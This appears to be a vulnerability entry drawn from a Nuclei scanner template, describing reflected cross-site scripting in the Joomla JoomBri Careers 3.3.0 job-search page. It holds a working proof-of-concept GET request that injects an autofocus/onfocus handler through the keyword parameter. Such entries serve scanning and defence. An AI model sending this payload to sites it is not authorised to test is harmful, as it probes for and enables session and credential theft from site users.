# Vulnerability: Joomla JoomBri Careers 3.3.0 - Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`joomla-joombri-careers-xss.yaml`)

## Description
The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/for-jobseekers/search-jobs?keyword=l9x1q%22onfocus%3D%22alert(document.domain)%22autofocus%3D%22ak5aghi5u9p
```

